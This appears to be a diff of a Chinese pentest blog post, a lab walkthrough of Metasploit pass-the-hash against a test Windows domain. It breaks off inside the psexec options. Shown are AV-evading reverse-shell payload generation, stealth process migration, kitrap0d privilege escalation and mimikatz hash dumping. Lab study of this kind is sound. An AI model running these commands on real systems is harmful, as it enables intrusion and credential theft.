-<li><a href="https://zhuanlan.zhihu.com/p/501491931?_blank">https://zhuanlan.zhihu.com/p/501491931</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"><meta name=author content="Reber"><title>使用 MSF 进行 PtH 和 PtT | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>使用 MSF 进行 PtH 和 PtT</h1><div class=post-meta><time>2023-03-25</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div><h3 id=0x00-概述>0x00 概述</h3><ul><li><p>环境</p><p>攻击机 MSF：172.20.10.2<br>DC (Server2008R2X64)：10.11.11.5<br>目标机 (Win7ProX86)：10.11.11.14</p></li><li><p>PtH 和 PtT</p><p>PtH 一般用来进行域内横向<br>PtT 一般是在已经获取域控的前提下利用，用来做权限维持</p></li></ul><h3 id=0x01-前期准备>0x01 前期准备</h3><ul><li><p>生成 payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>172.20.10.2 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -b <span style=color:#e6db74>&#39;\x00\x0a\xff&#39;</span> --platform windows -a x86  -e x86/shikata_ga_nai -i <span style=color:#ae81ff>5</span>  -f exe -o 86.exe
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>172.20.10.2 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -b <span style=color:#e6db74>&#39;\x00&#39;</span> --platform windows -a x64  -e x64/xor -i <span style=color:#ae81ff>5</span>  -f exe -o 64.exe
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -p 指定 payload (用 msfvenom -l payloads 可查看所有 payload)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -a 指定目标指令集架构</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -e 指定用什么编码器编码(多次编码变幻可以免杀，用 msfvenom -l encoders 可查看编码类型)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -i 指定编码迭代的次数</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># --platform 执行目标的平台</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -f 指定输出格式，可用 msfvenom --help-formats查看</span>
+</span></span></code></pre></div></li><li><p>配置监听</p><p>ExitOnSession 在接收到 seesion 后继续监听端口，防止假死与假 session<br>SessionCommunicationTimeout 默认情况下，会话在 5 分钟没有任何活动会被杀死，可将此项修改为 0<br>SessionExpirationTimeout 默认情况下，一个星期后，会话将被强制关闭，修改为0可永久不会被关闭<br>EnableStageEncoding 用来设置二级有效负载是否进行编码<br>StageEncoder 指定编码器类型<br>StageEncoder 指定的编码器对有效负载编码时失败后，是否回退到默认编码器（例如 x86/shikata_ga_nai）。如果将 set StageEncodingFallback 设置为 false，则在编码失败时将不会回退到默认编码器。这可以帮助确保有效负载编码的一致性和可靠性。<br>exploit -j -z -j 为后台任务，-z 为成功后不主动发送 stage</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf &gt; use exploit/multi/handler
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set LHOST 0.0.0.0
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set LPORT <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set ExitOnSession false
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set SessionCommunicationTimeout <span style=color:#ae81ff>36000</span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set SessionExpirationTimeout <span style=color:#ae81ff>36000</span>
+</span></span><span style=display:flex><span>// msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set EnableStageEncoding true
+</span></span><span style=display:flex><span>// msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set StageEncoder x64/xor
+</span></span><span style=display:flex><span>// msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set StageEncodingFallback false
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; exploit -j -z
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 0.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 0.0.0.0:4444
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; jobs
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Jobs
+</span></span><span style=display:flex><span><span style=color:#f92672>====</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Id  Name                    Payload                          Payload opts
+</span></span><span style=display:flex><span>--  ----                    -------                          ------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
+</span></span></code></pre></div></li></ul><h3 id=0x02-目标机反弹-shell>0x02 目标机反弹 shell</h3><ul><li><p>在目标主机上执行生成的 payload：86.exe，收到 shell</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt;
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>175686</span> bytes<span style=color:#f92672>)</span> to 172.20.10.2
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>172.20.10.2:4444 -&gt; 172.20.10.2:60181<span style=color:#f92672>)</span> at 2023-03-06 12:31:17 +0800
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Active sessions
+</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Id  Name  Type                     Information              Connection
+</span></span><span style=display:flex><span>--  ----  ----                     -----------              ----------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>         meterpreter x86/windows  TEST<span style=color:#ae81ff>\z</span>hangsan @ WIN7PRO  172.20.10.2:4444 -&gt; 172.20.10.14:60997 <span style=color:#f92672>(</span>172.20.10.14<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: TEST<span style=color:#ae81ff>\z</span>hangsan
+</span></span></code></pre></div></li><li><p>进程迁移</p><p>将进程迁移到了资源管理器，防止目标通过任务管理器或者使用 tasklist 看到我们的进程。<br>一般注入 svchost.exe、explorer.exe、lsass.exe、services.exe、winlogon.exe、rundll32.exe、taskhost.exe、spoolsv.exe</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; ps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Process List
+</span></span><span style=display:flex><span><span style=color:#f92672>============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PID   PPID  Name               Arch  Session  User           Path
+</span></span><span style=display:flex><span>---   ----  ----               ----  -------  ----           ----
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     <span style=color:#f92672>[</span>System Process<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System
+</span></span><span style=display:flex><span><span style=color:#ae81ff>272</span>   <span style=color:#ae81ff>4</span>     smss.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>444</span>   <span style=color:#ae81ff>384</span>   winlogon.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>504</span>   <span style=color:#ae81ff>396</span>   lsass.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>692</span>   <span style=color:#ae81ff>832</span>   dwm.exe            x86   <span style=color:#ae81ff>1</span>        TEST<span style=color:#ae81ff>\z</span>hangsan  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\D</span>wm.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>808</span>   <span style=color:#ae81ff>1272</span>  explorer.exe       x86   <span style=color:#ae81ff>1</span>        TEST<span style=color:#ae81ff>\z</span>hangsan  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\E</span>xplorer.EXE
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1548</span>  <span style=color:#ae81ff>488</span>   kms-server.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1964</span>  <span style=color:#ae81ff>488</span>   taskhost.exe       x86   <span style=color:#ae81ff>1</span>        TEST<span style=color:#ae81ff>\z</span>hangsan  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\t</span>askhost.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2072</span>  <span style=color:#ae81ff>2748</span>  msiexec.exe        x86   <span style=color:#ae81ff>1</span>                       C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\m</span>siexec.exe
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; migrate <span style=color:#ae81ff>808</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migrating from <span style=color:#ae81ff>2748</span> to 808...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Migration completed successfully.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; background
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Backgrounding session 1...
+</span></span></code></pre></div></li><li><p>进行提权</p><p>通过 local_exploit_suggester 获取 msf 建议的 exploit</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run post/multi/recon/local_exploit_suggester
+</span></span><span style=display:flex><span>msf6 post<span style=color:#f92672>(</span>multi/recon/local_exploit_suggester<span style=color:#f92672>)</span> &gt; set session <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>msf6 post<span style=color:#f92672>(</span>multi/recon/local_exploit_suggester<span style=color:#f92672>)</span> &gt; run
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 172.20.10.2 - Collecting local exploits <span style=color:#66d9ef>for</span> x86/windows...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 172.20.10.2 - <span style=color:#ae81ff>168</span> exploit checks are being tried...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 172.20.10.2 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 172.20.10.2 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 172.20.10.2 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 172.20.10.2 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Running check method <span style=color:#66d9ef>for</span> exploit <span style=color:#ae81ff>41</span> / <span style=color:#ae81ff>41</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 172.20.10.2 - Valid modules <span style=color:#66d9ef>for</span> session 3:
+</span></span><span style=display:flex><span><span style=color:#f92672>============================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style=display:flex><span>-   ----                                                           -----------------------  ------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>   exploit/windows/local/bthpan                                    No                       The target is not exploitable.
+</span></span><span style=display:flex><span>。。。。
+</span></span><span style=display:flex><span>。。。。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
+</span></span></code></pre></div><p>利用 msf 建议的 exploit 进行提权</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 post<span style=color:#f92672>(</span>multi/recon/local_exploit_suggester<span style=color:#f92672>)</span> &gt; use exploit/windows/local/ms10_015_kitrap0d
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>exploit/windows/local/ms10_015_kitrap0d<span style=color:#f92672>)</span> &gt; set session <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/local/ms10_015_kitrap0d<span style=color:#f92672>)</span> &gt; run
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 172.20.10.2:4444
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Reflectively injecting payload and triggering the bug...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Launching msiexec to host the DLL...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Process <span style=color:#ae81ff>2072</span> launched.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Reflectively injecting the DLL into 2072...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Exploit finished, wait <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>hopefully privileged<span style=color:#f92672>)</span> payload execution to complete.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>175686</span> bytes<span style=color:#f92672>)</span> to 172.20.10.2
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>172.20.10.2:4444 -&gt; 172.20.10.14:61686<span style=color:#f92672>)</span> at 2023-03-06 12:40:02 +0800
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
+</span></span><span style=display:flex><span>meterpreter &gt; shell
+</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>680</span> created.
+</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>2</span> created.
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>�汾 6.1.7600<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>��Ȩ���� <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation����������Ȩ��
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>Active code page: <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;net group <span style=color:#e6db74>&#34;domain admins&#34;</span> /domain
+</span></span><span style=display:flex><span>net group <span style=color:#e6db74>&#34;domain admins&#34;</span> /domain
+</span></span><span style=display:flex><span>The request will be processed at a domain controller <span style=color:#66d9ef>for</span> domain test.com.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Group name     Domain Admins
+</span></span><span style=display:flex><span>Comment        ָ���������Ա
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Members
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
+</span></span><span style=display:flex><span>admin                    Administrator
+</span></span><span style=display:flex><span>The command completed successfully.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;exit
+</span></span><span style=display:flex><span>exit
+</span></span><span style=display:flex><span>meterpreter &gt; background
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Backgrounding session 2...
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/local/ms10_015_kitrap0d<span style=color:#f92672>)</span> &gt; sessions
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Active sessions
+</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Id  Name  Type                     Information                    Connection
+</span></span><span style=display:flex><span>--  ----  ----                     -----------                    ----------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>         meterpreter x86/windows  TEST<span style=color:#ae81ff>\z</span>hangsan @ WIN7PRO        172.20.10.2:4444 -&gt; 172.20.10.14:60181 <span style=color:#f92672>(</span>172.20.10.14<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>         meterpreter x86/windows  NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM @ WIN7PRO  172.20.10.2:4444 -&gt; 172.20.10.14:61686 <span style=color:#f92672>(</span>172.20.10.14<span style=color:#f92672>)</span>
+</span></span></code></pre></div></li></ul><h3 id=0x03-进行-hash-传递攻击pth>0x03 进行 Hash 传递攻击(PtH)</h3><ul><li><p>首先通过域内用户 SYSTEM 权限得到 ntlm hash</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/local/ms10_015_kitrap0d<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 2...
+</span></span><span style=display:flex><span>meterpreter &gt; load kiwi
+</span></span><span style=display:flex><span>meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>405357</span> <span style=color:#f92672>(</span>00000000:00062f6d<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Session           : CachedInteractive from <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>User Name         : Administrator
+</span></span><span style=display:flex><span>Domain            : TEST
+</span></span><span style=display:flex><span>Logon Server      : WIN-2008
+</span></span><span style=display:flex><span>Logon Time        : 2023/3/5 21:06:10
+</span></span><span style=display:flex><span>SID               : S-1-5-21-3160176211-3702513722-812664031-500
+</span></span><span style=display:flex><span>    msv :
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
+</span></span><span style=display:flex><span>    * Username : Administrator
+</span></span><span style=display:flex><span>    * Domain   : TEST
+</span></span><span style=display:flex><span>    * LM       : f26fb3ae03e93ab913328873c0db4945
+</span></span><span style=display:flex><span>    * NTLM     : 0e032b9d51a580ac6cdfabad8bc97a38
+</span></span><span style=display:flex><span>    * SHA1     : c17a16040770e68ea65ce528b5f503dba3663d16
+</span></span><span style=display:flex><span>    ......
+</span></span><span style=display:flex><span>    ......
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>136194</span> <span style=color:#f92672>(</span>00000000:00021402<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Session           : Interactive from <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>User Name         : zhangsan
+</span></span><span style=display:flex><span>Domain            : TEST
+</span></span><span style=display:flex><span>Logon Server      : WIN-2008
+</span></span><span style=display:flex><span>Logon Time        : 2023/3/5 20:31:02
+</span></span><span style=display:flex><span>SID               : S-1-5-21-3160176211-3702513722-812664031-1118
+</span></span><span style=display:flex><span>    msv :
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
+</span></span><span style=display:flex><span>    * Username : zhangsan
+</span></span><span style=display:flex><span>    * Domain   : TEST
+</span></span><span style=display:flex><span>    * LM       : 1c27b75762feeeb3e72c57ef50f76a05
+</span></span><span style=display:flex><span>    * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
+</span></span><span style=display:flex><span>    * SHA1     : 491010a4fb3715098e98c855175c841ac2d1badc
+</span></span><span style=display:flex><span>    ......
+</span></span><span style=display:flex><span>    ......
+</span></span></code></pre></div><p>查看域内管理员组用户</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; shell
+</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>716</span> created.
+</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>3</span> created.
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>�汾 6.1.7600<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>��Ȩ���� <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation����������Ȩ��
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>Active code page: <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;net group <span style=color:#e6db74>&#34;domain admins&#34;</span> /domain
+</span></span><span style=display:flex><span>net group <span style=color:#e6db74>&#34;domain admins&#34;</span> /domain
+</span></span><span style=display:flex><span>The request will be processed at a domain controller <span style=color:#66d9ef>for</span> domain test.com.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Members
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
+</span></span><span style=display:flex><span>admin                    Administrator
+</span></span><span style=display:flex><span>The command completed successfully.
+</span></span><span style=display:flex><span>meterpreter &gt; background
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Backgrounding session 2...
+</span></span></code></pre></div></li><li><p>进行 pth 获取 DC 的权限</p><p>使用域内管理员组用户的 hash，这里用 admin 这个用户</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/local/ms10_015_kitrap0d<span style=color:#f92672>)</span> &gt; use exploit/windows/smb/psexec
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/smb/psexec<span style=color:#f92672>)</span> &gt; options
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/windows/smb/psexec<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Name                  Current Setting                    Required  Description
+</span></span><span style=display:flex><span>----                  ---------------                    --------  -----------
+</span></span><span style=display:flex><span>RHOSTS                10.11.11.5                         yes       The target host<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, see https://docs.metasploit.com/docs/usi
+</span></span><span style=display:flex><span>                                                                    ng-metasploit/basics/using-metasploit.html
+</span></span><span style=display:flex><span>RPORT                 <span style=color:#ae81ff>445</span>                                yes       The SMB service port <span style=color:#f92672>(</span>TCP<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SERVICE_DESCRIPTION                                      no        Service description to be used on target <span style=color:#66d9ef>for</span> pretty listing
+</span></span><span style=display:flex><span>SERVICE_DISPLAY_NAME                                     no        The service display name
+</span></span><span style=display:flex><span>SERVICE_NAME                                             no        The service name
+</span></span><span style=display:flex><span>SMBDomain             test.com                           no        The Windows domain to use <span style=color:#66d9ef>for</span> authentication
+</span></span><span style=display:flex><span>SMBPass               00000000000000000000000000000000:  no        The password <span style=color:#66d9ef>for</span> the specified username
+</span></span><span style=display:flex><span>                      209c6174da490caeb422f3fa5a7ae634
+</span></span><span style=display:flex><span>SMBSHARE                                                 no        The share to connect to, can be an admin share <span style=color:#f92672>(</span>ADMIN$,C$,..
+</span></span><span style=display:flex><span>                                                                    .<span style=color:#f92672>)</span> or a normal read/write folder share
